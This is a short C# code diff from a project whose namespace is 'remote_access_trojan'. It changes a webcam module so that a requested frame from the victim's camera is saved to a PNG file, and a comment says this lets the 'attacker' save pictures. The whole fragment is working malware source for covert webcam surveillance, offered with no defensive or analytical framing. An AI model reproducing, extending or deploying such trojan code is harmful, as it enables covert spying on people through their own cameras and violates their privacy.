@@ -14,6 +14,8 @@ namespace remote_access_trojan
         private VideoCaptureDevice capture = null;
         private Bitmap bit = null;
         private VideoFileWriter writer;
+        private bool needPicture = false;
+        private int pictureIndex = 1;
 
         public Webcam()
         {
@@ -39,14 +41,19 @@ namespace remote_access_trojan
         //cam_NewFram handler
         private void capture_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
-            bit = (Bitmap)eventArgs.Frame.Clone();
+            if (needPicture)
+            {
+                bit = (Bitmap)eventArgs.Frame.Clone();
+                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + pictureIndex + ".png"));
+                needPicture = false;
+            }
         }
 
         //Takes a screenshot and allows attacker to save where they want
         public void TakePicture(int index)
         {
-            if (bit != null)
-                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + index + ".png"));
+            pictureIndex = index;
+            needPicture = true;
         }
 
         //Stops camera
